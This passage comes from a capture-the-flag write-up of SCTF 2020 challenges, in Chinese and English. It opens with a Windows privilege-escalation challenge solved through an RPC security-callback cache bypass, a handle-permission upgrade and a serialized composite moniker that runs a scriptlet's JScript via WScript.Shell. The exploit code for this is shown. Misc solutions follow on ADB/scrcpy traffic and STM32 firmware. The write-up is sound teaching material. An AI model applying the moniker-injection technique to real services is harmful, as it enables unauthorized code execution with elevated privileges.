} RPC_DISPATCH_TABLE, __RPC_FAR * PRPC_DISPATCH_TABLE;
```
`RPC_DISPATCH_TABLE`的`DispatchTableCount`指定调度函数数量，与`DispatchTable`指向的指针数组中的元素个数相同，且与默认管理器入口点向量中的元素个数相同，这是我们确定有多少个服务例程的一种方式。

回到`RPC_SERVER_INTERFACE`中，其`Flags`成员中的标志位与`InterpreterInfo`指针的值（有效或空指针）、`DispatchTable->DispatchTable`中调度函数的类型共同确定列集模式与其他编译开关（如传输语法）。例如，本题中`Flag`值为`0x04000000`, `InterpreterInfo`非空，`DispatchFunction`为`NdrServerCall2`，则MIDL选项有`/Oi*f`。`/Oi*`系选项中自动化寻找服务例程很容易，但`/Os`下则麻烦一些，具体就不展开讲了。

若使用`/Oi*`，则`InterpreterInfo`指向`MIDL_SERVER_INFO`结构：
```cpp=
typedef struct  _MIDL_SERVER_INFO_
    {
    PMIDL_STUB_DESC                     pStubDesc;
    const SERVER_ROUTINE     *          DispatchTable;
    PFORMAT_STRING                      ProcString;
    const unsigned short *              FmtStringOffset;
    const STUB_THUNK *                  ThunkTable;
    PRPC_SYNTAX_IDENTIFIER              pTransferSyntax;
    ULONG_PTR                           nCount;
    PMIDL_SYNTAX_INFO                   pSyntaxInfo;
    } MIDL_SERVER_INFO, *PMIDL_SERVER_INFO;
```
结构成员`DispatchTable`指向服务例程指针数组，其数组下标值对应调用号。

使用findrpc解析本题中EntryService服务器，其注册的接口如下：
![](https://i.loli.net/2020/07/08/JQPtDrVIm76eXkz.png)
<br>
`Proc Handlers`显示了服务例程的地址，只有一个`0x402020`:
```cpp=
RPC_STATUS __cdecl sub_402020(RPC_BINDING_HANDLE BindingHandle)
{
  RPC_STATUS result; // eax
  CLIENT_CALL_RETURN v2; // esi
  RPC_STATUS v3; // eax
  RPC_WSTR StringBinding; // [esp+18h] [ebp-20h]
  CPPEH_RECORD ms_exc; // [esp+20h] [ebp-18h]

  StringBinding = 0;
  result = RpcStringBindingComposeW(0, L"ncalrpc", 0, L"hello", 0, &StringBinding);
  if ( result )
    return result;
  result = RpcBindingFromStringBindingW(StringBinding, &Binding);
  if ( result )
    return result;
  ms_exc.registration.TryLevel = 0;
  result = RpcImpersonateClient(BindingHandle);
  if ( result )
  {
    ms_exc.registration.TryLevel = -2;
  }
  else
  {
    v2.Pointer = sub_401D60((char)Binding).Pointer;
    RpcRevertToSelf();
    ms_exc.registration.TryLevel = -2;
    result = RpcStringFreeW(&StringBinding);
    if ( !result )
    {
      v3 = RpcBindingFree(&Binding);
      if ( v3 )
        v2.Simple = v3;
      result = v2.Simple;
    }
  }
  return result;
}
```

它没做什么特别的事情，只在[仿冒（Impersonation）](https://docs.microsoft.com/en-us/windows/win32/com/impersonation)客户端后调用了另一个RPC服务器，即SecondService的例程。

如果你找到了SecondService中控制服务器启动的过程，你应该注意到`RpcServerRegisterIf2`中的`IfCallbackFn`，这是自定义的安全回调函数，当RPC请求到达后，回调检查客户端进程PID是否与EntryService服务进程的PID相同，若不同则拒绝请求。
```cpp=
BOOL __thiscall sub_4019A0(_DWORD *this)
{
  _DWORD *v1; // esi

  v1 = this;
  if ( this[10] )
    return SetEvent((HANDLE)v1[11]);
  while ( !RpcServerUseProtseqEpW(L"ncalrpc", 0x4D2u, L"hello", 0)
       && !RpcServerRegisterIf2(&unk_4044B8, 0, 0, 0x20u, 0x4D2u, 0, IfCallbackFn)
       && !RpcServerListen(1u, 0x4D2u, 0) )
  {
    if ( v1[10] )
      return SetEvent((HANDLE)v1[11]);
  }
  v1[10] = 1;
  return SetEvent((HANDLE)v1[11]);
}
```

由于EntryService仅调用SecondService中一个无关紧要的RPC例程：
```cpp=
int sub_401AD0()
{
  struct _SYSTEM_INFO SystemInfo; // [esp+0h] [ebp-28h]

  GetSystemInfo(&SystemInfo);
  return 0;
}
```
想调用SecondService的其他例程必须使调用方PID与服务PID相等，我们可能会考虑在EntryService的进程空间内执行任意代码，或者寻找任意写原语以修改EPROCESS结构（我不了解是否可行，即便可以，通过这些服务提权就完全不必要，那是更严重的问题），或者期望对`QueryServiceStatusEx`的调用失败，并且你的Pid是0！无论哪种方式都很困难。

让我们回顾`RpcServerRegisterIf2`的函数原型，其中`Flag`参数指定接口注册标志。如果你查看文档，`RPC_IF_SEC_NO_CACHE`用于禁用安全回调缓存，对每个RPC调用强制执行安全回调，这暗示若不指定该标志，则回调结果会默认被缓存，本题中没有指定此标志。

由于EntryService是在仿冒客户端后调用的SecondService，并且能够通过回调检查，则当再次以客户端用户身份直接调用SecondService时，安全回调将不被触发。

绕过PID检查后，查看Proc1例程
```cpp=
  result = CreateClassMoniker(&rclsid, &ppmk);
  if ( result < 0 )
    return result;
  result = CreateStreamOnHGlobal(0, 1, &ppstm);
  if ( result < 0 )
    return result;
  v4 = OleSaveToStream((LPPERSISTSTREAM)ppmk, ppstm);
  if ( v4 < 0 )
  {
    ppstm->lpVtbl->Release(ppstm);
    return v4;
  }
  v5 = CreateFileMappingW((HANDLE)0xFFFFFFFF, 0, 4u, 0, 0x100u, 0);
  v6 = v5;
  if ( !v5 )
  {
    ppstm->lpVtbl->Release(ppstm);
    return GetLastError();
  }
  v7 = MapViewOfFile(v5, 0xF001Fu, 0, 0, 0x100u);
  v8 = ppstm->lpVtbl;
  if ( v7 )
  {
    result = v8->Stat(ppstm, (STATSTG *)&v17, 1);
    if ( result >= 0 )
    {
      ((void (__stdcall *)(LPSTREAM, _DWORD, _DWORD, _DWORD, _DWORD))ppstm->lpVtbl->Seek)(ppstm, 0, 0, 0, 0);
      *v7 = v18;
      result = ppstm->lpVtbl->Read(ppstm, v7 + 1, v18, (ULONG *)&v16);
      ......
      ......
```
这个代码片段创建Class Moniker，并创建一个文件映射对象，将Moniker状态信息保存到共享内存中，前4个字节保存字节流长度：
```
size 
serialized_class_moniker
```

在这之后，将句柄复制到调用进程中，复制时指定访问权限为只读
```cpp=
if ( I_RpcBindingInqLocalClientPID(Binding, &Pid) )
{
  result = -2;
}
else
{
  RpcImpersonateClient(Binding);
  v9 = OpenProcess(0x40u, 0, Pid);
  if ( !v9 )
    return GetLastError();
  v10 = v9;
  v11 = GetCurrentProcess();
  if ( !DuplicateHandle(v11, v6, v10, &TargetHandle, 4u, 0, 0) )
    return GetLastError();
  *(_DWORD *)a2 = TargetHandle;
  RpcRevertToSelf();
  ppmk->lpVtbl->Release(ppmk);
  ppstm->lpVtbl->Release(ppstm);
  result = 0;
}
```

通常来说客户端无法对复制到本进程的文件映射对象重新请求写入权限，但这里SecondService在创建对象时，没有为对象指定名字：
```
 CreateFileMappingW(-1, ...,  NULL); # 最后一个参数为NULL
```
根据[MSDN](https://docs.microsoft.com/en-us/windows/win32/secauthz/securable-objects)，一些无名对象是没有安全性的，比如本题中的文件映射对象在没有名字也没有安全描述符，这意味着即使SecondService复制给客户端的句柄仅有读权限，客户端也可以通过DuplicateHandle来给自己复制一个有写权限的新句柄，从而修改共享内存。

那么接下来我们要怎样做共享内存中的布局？看看SecondService中的Proc2例程：
```cpp=
 CoInitialize(0);
  v2 = (ULONG *)MapViewOfFile(hFileMappingObject, 0xF001Fu, 0, 0, 0x100u);
  if ( v2 )
  {
    result = CreateStreamOnHGlobal(0, 1, &ppstm);
    if ( result >= 0 )
    {
      ((void (__stdcall *)(LPSTREAM, _DWORD, _DWORD, _DWORD, _DWORD))ppstm->lpVtbl->Seek)(ppstm, 0, 0, 0, 0);
      result = ppstm->lpVtbl->Write(ppstm, v2 + 1, *v2, (ULONG *)&v9);
      if ( result >= 0 )
      {
        ((void (__stdcall *)(LPSTREAM, _DWORD, _DWORD, _DWORD, _DWORD))ppstm->lpVtbl->Seek)(ppstm, 0, 0, 0, 0);
        result = OleLoadFromStream(ppstm, &iidInterface, &ppvObj);
        if ( result >= 0 )
        {
          CreateBindCtx(0, &ppbc);
          v4 = (*(int (__stdcall **)(LPVOID, LPBC, _DWORD, void *, char *))(*(_DWORD *)ppvObj + 32))(
                 ppvObj,
                 ppbc,
                 0,
                 &unk_4041E0,
                 &v8);
          if ( v4 >= 0 )
          {
            ppbc->lpVtbl->Release(ppbc);
            (*(void (__stdcall **)(LPVOID))(*(_DWORD *)ppvObj + 8))(ppvObj);
            ppstm->lpVtbl->Release(ppstm);
            result = 0;
          }
          else
          {
            ppbc->lpVtbl->Release(ppbc);
            (*(void (__stdcall **)(LPVOID))(*(_DWORD *)ppvObj + 8))(ppvObj);
            ppstm->lpVtbl->Release(ppstm);
            result = v4;
          }
        }
      }
    }
  }
  else
  {
    CloseHandle(hFileMappingObject);
    result = GetLastError();
  }
  return result;
```

它读取4个字节，即序列化的`Class Moniker`状态字节流的长度，再创建新的对象并使用这些信息恢复对象状态。综合`Proc1`和`Proc2`的代码，可以发现这里出现了类型混淆，通过在共享内存中写入一个恶意的Fake Moniker来触发对象绑定，由于我们可控制对象的状态，通过精心构造恶意对象可以在绑定时造成代码执行。

名字对象（Moniker）是一种标识其他对象的COM对象，它实现`IMoniker`接口。对于我们的目的，有三个重要方法需要了解：
```cpp=
[
   object,
   uuid(0000000f-0000-0000-C000-000000000046),
   pointer_default(unique)
 ]
 interface IMoniker {
 
   ......
   ......
   
   [local]
   HRESULT BindToObject(
     [in, unique] IBindCtx *pbc,
     [in, unique] IMoniker *pmkToLeft,
     [in] REFIID riidResult,
     [out, iid_is(riidResult)] void **ppvResult);
 
   // Inherit from IPersistStream
   HRESULT Load( 
     [in, unique] IStream *pStm);
 
   // Inherit from IPersistStream
   HRESULT Save(
     [in, unique] IStream *pStm,
     [in] BOOL fClearDirty);
     
   ......
   ......
 }
```
* `BindToObject`用于绑定到特定的对象，`ppvResult`参数的`iid_is`属性表明其为COM接口指针，即所绑定的对象接口；`pmkToLeft`指向用于复合Moniker中先绑定位于该Moniker左边的Moniker。
* `Save`和`Load`方法分别用于保存与加载名字对象

OLE实现了一些内置的Moniker， 如File Moniker，URL Moniker， OBJREF Moniker等。一些方法用于创建Moniker，通常不是`CoCreateInstance`（尽管有时也可以）等API，而是一组Helper函数，如`CreateFileMoniker`，或者通过`MkParseDisplayName`解析显示字符串。

一种使用Moniker执行代码的方式是使用`Script Moniker`。该Moniker可通过`MkParseDisplayName`创建并绑定到scriptletfile对象（从sct文件中解析）以执行jscript代码，理论上，我们可以创建该对象并保存到共享内存中，并触发`Proc2`以恢复该对象并执行代码，但Script Moniker对IMoniker接口的实现并不完整，`Save`和`Load`方法都返回`E_NOTIMPL`，这使得序列化对象到内存区中不太可行。作为代替，我们使用File Moniker和New Moniker组合为一个Composite Moniker以达到同样的效果，其原理是绑定Composite Moniker时，File Moniker先从sct文件中恢复scriptlet file对象，再通过New Moniker（类似CoCreateInstance）绑定到对象的实例，从而执行sct文件中的代码：
```cpp=
if (SUCCEEDED(CreateFileMoniker(OLESTR("c:\\\\users\\emanon\\desktop\\SCTF-EoP\\1.sct"), &pFileMnk)))
{
    CoCreateInstance(CLSID_NEWMONIKER, NULL, CLSCTX_ALL, IID_IUnknown, (LPVOID *)&pNewMnk);
    CreateGenericComposite(pFileMnk, pNewMnk, &pCompositeMnk);
}
```

之后将其保存到流对象中并拷贝至共享内存，然后调用`Proc2`：

```cpp=
CreateBindCtx(NULL, &pBindCtx);
if (SUCCEEDED(CreateFileMoniker(OLESTR("c:\\\\users\\emanon\\desktop\\SCTF-EoP\\1.sct"), &pFileMnk)))
{
    CoCreateInstance(CLSID_NEWMONIKER, NULL, CLSCTX_ALL, IID_IUnknown, (LPVOID *)&pNewMnk);
    CreateGenericComposite(pFileMnk, pNewMnk, &pCompositeMnk);

    if (FAILED(hr = CreateStreamOnHGlobal(NULL, TRUE, &pStm))) {
        return hr;
    }


    if (FAILED(hr = OleSaveToStream(pCompositeMnk, pStm))) {
        pStm->Release();
        return hr;
    }

    if (FAILED(hr = pStm->Stat(&statstg, STATFLAG_NONAME)))
    {
        return hr;
    }

    offset.QuadPart = 0;
    pStm->Seek(offset, STREAM_SEEK_SET, NULL);
    *(ULONG *)pBuf = statstg.cbSize.QuadPart;
    if (FAILED(hr = pStm->Read((LPBYTE)pBuf + sizeof(ULONG), statstg.cbSize.QuadPart, &pcbRead)))
    {
        return hr;
    }

    hr = Proc2(SecondInterface_v0_0_c_ifspec, hFileSource);

}
					
```

sct文件：
```cpp=
<?XML version="1.0"?>
<scriptlet>

<registration
    description="Bandit"
    progid="Bandit"
    version="1.00"
    classid="{CD3AFA76-B84F-48F0-9393-7EDC34128127}"
	>

</registration>
<script language="JScript">
<![CDATA[

var r = new ActiveXObject("WScript.Shell").Run("c:\\windows\\system32\\notepad.exe");

]]>
</script>


</scriptlet>
```


## Misc

### AndroidDisplayBridge

Open the attachment in Wireshark:
![image](https://i.imgur.com/EgwUVtV.png)
Port 5555, It's ```Network ADB``` , let's dig deeper.

Generally we want to see the document of ADB protocol, which can be found here:
https://github.com/cstyan/adbDocumentation
You can know that ```WRTE``` means the packet is sent to the client.

> you can also skip this if you directly found this packet, but it may be harder afterwards:

So it's actually something about scrcpy. 
![img](https://i.imgur.com/q2TlBxC.png)

Filter out packets sent from the compter: 
what does these packets mean?

![img](https://i.imgur.com/n9b38AH.png)

Search the web and you can find this github issue:
https://github.com/Genymobile/scrcpy/issues/673
says there's no documentation, but you can refer to the source code:
https://github.com/Genymobile/scrcpy/blob/6b3d9e3eab1d9ba4250300eccd04528dbee9023a/app/tests/test_control_msg_serialize.c

```c
static void test_serialize_inject_mouse_event(void) {
    struct control_msg msg = {
        .type = CONTROL_MSG_TYPE_INJECT_MOUSE_EVENT,
        .inject_mouse_event =
            {
                .action = AMOTION_EVENT_ACTION_DOWN,
                .buttons = AMOTION_EVENT_BUTTON_PRIMARY,
                .position =
                    {
                        .point =
                            {
                                .x = 260,
                                .y = 1026,
                            },
                        .screen_size =
                            {
                                .width = 1080,
                                .height = 1920,
                            },
                    },
            },
    };
    unsigned char buf[CONTROL_MSG_SERIALIZED_MAX_SIZE];
    int size = control_msg_serialize(&msg, buf);
    assert(size == 18);
    const unsigned char expected[] =
    { CONTROL_MSG_TYPE_INJECT_MOUSE_EVENT,
      0x00, // AKEY_EVENT_ACTION_DOWN
      0x00,
      0x00,
      0x00,
      0x01, // AMOTION_EVENT_BUTTON_PRIMARY
    } 0x00,
        0x00, 0x01, 0x04, 0x00, 0x00, 0x04, 0x02, // 260 1026
        0x04, 0x38, 0x07, 0x80,                   // 1080 1920
};
assert(!memcmp(buf, expected, sizeof(expected)));
```
Then export the capture file as json and match patterns like above, extracting the points(X,Y):
(fish script, and "57:52:54:45" is the adb command "WRTE" you got from the documentation)
```fish
for i in (cat /home/leohearts/Desktop/tmp.json |jq .[]._source.layers.tcp | grep 57:52:54:45 | grep -o -E '00:00:..:..:00:00:..:..:04:38:08:e8:ff' | grep -o -E '..:..:' | grep -v "00:00" | grep -v '04:38' | grep -v '08:e8' | sed 's/://g')
bash -c 'echo $((16#'$i'))' >> pixels
end
```
Then use Python to draw it back to an image:
```python
from PIL import Image
def newImg():
    img = Image.new('RGB', (2000, 2000))
    while True:
        try:
            x = int(input())
            y = int(input())
            img.putpixel((x,y), (155,155,55))
        except:
            break
    img.save('sqr.png')
    return img

wallpaper = newImg()
wallpaper.show()
```
```cat pixels | python3 image.py```
Then thats the flag.
![flag_image](https://i.imgur.com/TxCgGpe.png)

### Can you hear?
用qsstv解码就行

### Dou dizhu
略～

### Password Lock
#### 1.stm32

stm32f103c8t6
flash 64k, 0x08000000起始, size为0x10000
ram 20k, 从0x20000000启始, size为0x5000
再了解一下stm32的运行方式, 在外设寄存器地址配置寄存器
题目是按键锁， 那么肯定是有gpio输入实现按键功能， 按键输入只能是两种方式：

1.读gpio状态

2.外部中断

#### 2.main函数

跟进main函数第一个0x2f0, 

![](http://image.skywang.fun/picGO/20200701202941.png)

![](http://image.skywang.fun/picGO/20200701202931.png)

并查阅外设地址, 

![](http://image.skywang.fun/picGO/20200701202921.png)

可以知道这个函数实在配置RCC, 时钟部分

可以用查表的方法, 也可以用Ghidra的插件SVD-Loader也可以实现, 原理都是一样的.

然后用这个方法给其他的未知函数快速命名

##### 串口发送

![](http://image.skywang.fun/picGO/20200701203629.png)

可以定位到一个关于串口发送的函数, 把hex转字符之后可以看到'stcf{'字样

![](http://image.skywang.fun/picGO/20200701203814.png)

#### 3.中断在flash里的映射

![](http://image.skywang.fun/picGO/20200702135541.png)

![](http://image.skywang.fun/picGO/20200702135604.png)

当成一样的去看就行, 所以我就没去添加

#### 4. EXTI, DMA1中断处理函数

通过中断向量表查找中断服务函数地址

![](http://image.skywang.fun/picGO/20200702135616.png)

着重去看这些地址

stm32使用thumb指令, 地址+1

![](http://image.skywang.fun/picGO/20200702135626.png)

![](http://image.skywang.fun/picGO/20200702135641.png)

新建一个函数

![](http://image.skywang.fun/picGO/20200702135654.png)

#### 5.分析外部中断

首先是EXTI1部分

1. 首先第一个参数, 外设地址为0x4001 0414,![](http://image.skywang.fun/picGO/20200703145903.png)

![](http://image.skywang.fun/picGO/20200703150025.png)

![](http://image.skywang.fun/picGO/20200703150434.png)

地址为0x4001 0400 + 0x14的偏移, 然后赋值2, 也就是0b10, 可以看到相当于是外部中断线1挂起, 

剩下的EXTI2, EXTI3, EXTI4也是相同操作

2. 标志位

![](http://image.skywang.fun/picGO/20200702145857.png)

下一部是开始读取ram, 需要有板子进行动态调试才行........标志位去读取按键顺序, 就会把标志位+1操作,否则如果如果是5, 就继续+1.....

通过观察其他的EXTI2, EXTI3, EXTI4, 可以观察到触发中断的顺序就是1442413,

再观察最后一个EXTI3函数在DMA1处偏移0x44

![](http://image.skywang.fun/picGO/20200702150323.png)

20 = 0x14 

0x44 - 0x14 * (4-1) = 0x8

![](http://image.skywang.fun/picGO/20200702150720.png)

![](http://image.skywang.fun/picGO/20200702150923.png)

使能DMA1发送flag

题目要求拿到密码就行所以flag: SCTF{1442413}



### Password Lock Plus



#### 1.串口配置部分


发送STCF{

使用轮询发送完'STCF{'后，开启串口DMA，后续字符使用DMA发送

![](http://image.skywang.fun/picGO/20200702162202.png)
![](http://image.skywang.fun/picGO/20200706194054.png)


#### 2.DMA1_通道4配置

![](http://image.skywang.fun/picGO/20200702161828.png)

 1. 前两个操作为设置DMA的起始地址与目标地址(哪一个是目标在后面设置，这里为了好写提前透露外设是目标，寄存器是起始)，并且起始地址为0x20000000(在SRAM区里)，目标为USART的数据寄存器，也就是说DMA的目标是串口(串口1连接在DMA1_通道4上)

![](http://image.skywang.fun/picGO/20200702161507.png)

![](http://image.skywang.fun/picGO/20200702161519.png)

 2. 地址0x48就是对应的 偏移 = 0x48 - 0x14*(4-1) = 0xC

   0x1e操作为设置DMA传输数量与配置DMA，它配置为0x1e也就是说串口输出的有30位字符

![](http://image.skywang.fun/picGO/20200702161540.png)

 

 3. 根据之前的计算方式0x44对应的偏移是:0x8

   最后一个0x492,0x492对应‭010010010010的配置, 最后一个操作为配置DMA4(16bit->8bit|储存器增量，外设非增量|储存器->外设|允许传输完成中断)

![](http://image.skywang.fun/picGO/20200702163137.png)

![](http://image.skywang.fun/picGO/20200706193315.png)

这里重点看一下数据宽度：

![](http://image.skywang.fun/picGO/20200706193505.png)

16bit->8bit模式意味着只会读取数组(8bit的数组)中2n的数据，2n+1的数据会被忽略掉。

```c
"t_h_1_s_1_s_n_0_t_r_1_g_h_t_f_l_a_g_"
提取之后就是th1s1sn0tr1ghtflag
```

![](http://image.skywang.fun/picGO/20200702163549.png)

在2,3,4 中断处理函数中都有对字符的替换, 

把 'th1s1sn0tr1ghtflag' 挨个替换之后得到flag

```
SCTF{that1s___r1ghtflag} //中间3个下划线
```
### EASYMISC
By using the commands binwalk and file, we found no results
![](https://i.loli.net/2020/07/08/DHLzaXwnNkfMbW1.png)
Based on the title, we're guessing it might be an inversion of hexadecimal.
Here we use the strrev function in PHP for this.
![](https://i.loli.net/2020/07/08/qSJMcaFmRTCilb3.png)
After processing, I opened it and found that it was still reporting an error, considered using winhex to view it, and found that it was a jpg file, so I added the file header(ffd8ff)
![](https://i.loli.net/2020/07/08/uHgpijreytaSC28.png)
Continued to find hints that it is RC4 encryption, but still no flag. test is not LSB steganography, etc. continued winhex view.
![](https://i.loli.net/2020/07/08/1EOcZpewAFDNXTM.png)
Suspicious strings found
xoBTuw36SfH4hicvCzFD9ESj
![](https://i.loli.net/2020/07/08/HF6Et3lYbc7zegv.png)

![](https://i.loli.net/2020/07/08/XqVFYQNTBEGWnge.png)


